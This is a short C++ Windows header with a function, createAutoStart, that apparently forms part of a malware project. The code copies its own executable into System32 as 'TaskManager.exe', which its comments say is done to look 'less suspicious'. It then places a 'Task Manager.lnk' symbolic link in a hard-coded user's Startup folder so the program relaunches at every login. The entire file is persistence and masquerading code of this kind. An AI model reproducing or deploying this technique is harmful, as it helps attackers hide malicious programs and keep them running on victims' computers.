#pragma once
#include <Windows.h>
#include <iostream>

using namespace std;

void createAutoStart() {
	/* COPY SOME FILE TO SYSTEM32 FOR LESS SUSSY */
	const unsigned int iMaxPathLength = 256;
	char fileName[iMaxPathLength] = { 0 }; //filename (for example in downloads)
	//Get the full path of the program
	GetModuleFileName(NULL, (LPWSTR)fileName, iMaxPathLength);

	//Copy file to system32 so its less suspicious, change name to windowdsdefender	
	LPCTSTR lpNewFileName = L"C:\\Windows\\System32\\TaskManager.exe";
	LPCTSTR copyFileName = (LPCTSTR)fileName;

	BOOL bSuccess = CopyFile(copyFileName, lpNewFileName, FALSE);

	if (!bSuccess) {
		cout << "Error while copying file to system32";
	}
	else {
		cout << "Copied file to system32";
	}


	LPCTSTR symlinkPath = L"C:\\Users\\Deniz\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Task Manager.lnk";

	if (CreateSymbolicLink(symlinkPath, (LPCWSTR)fileName, 0) == 0) {
		std::cout << "Error creating symbolic link: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "Symbolic link created successfully" << std::endl;
	}
}